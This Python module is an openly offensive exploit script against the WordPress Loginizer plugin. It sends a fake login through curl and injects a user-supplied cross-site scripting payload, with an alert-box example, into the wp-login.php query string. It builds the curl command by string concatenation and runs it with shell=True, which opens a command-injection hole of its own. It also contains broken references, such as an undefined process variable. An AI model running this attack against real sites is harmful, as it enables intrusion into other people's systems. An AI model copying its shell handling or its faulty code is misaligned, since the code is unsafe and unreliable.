import SmartGoogleCodePlugin
import requests
import subprocess
import shutil
import random
import string


def attack(url):
    print("\n-------------------------------------Loginizer plugin, XSS attack")
    payload = getChosenPayload()
    username = randomString(5)
    password = randomString(5)
    print("Trying fake login with data : "+username +" : "+ password)
    response = xssLogin(url,username,password,payload)



def xssLogin(url,username,password,payload):
    wp_login = url + '/wp-login.php?a='+payload
    wp_admin = url+'/wp-admin/'
    curlPath = input("Insert the CURL application ABSOLUTE path to the BIN folder")
    call = 'curl --data "log='+username+'&pwd='+password+'&wp-submit=LogIn&redirect_to=http://localhost/wordpress'+wp_admin+'&testcookie=1" "http://localhost/wordpress/wp-login.php?a='+payload+'"'
    print("cURL Call: " ,call)
    curlProcess = subprocess.Popen(call, stdout=subprocess.PIPE, cwd=curlPath, shell=True)
    SmartGoogleCodePlugin.processList.append(curlProcess)
    poll = curlProcess.poll()
    if (poll==None):
        print("CURL is running")
        return True
    else:
        output, error = phpProcess.communicate()
        print(output +" |||| "+ error)
        print("Process return code: " + string(phpProcess.returncode))
        return False

def getChosenPayload():
    print("Insert manual payload")
    return setManualPayload()


def setManualPayload():
    print("Payload example: <script> alert('xss')</script>")
    payload = input("Insert the payload : ")
    return payload



def randomString(stringLength=5):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

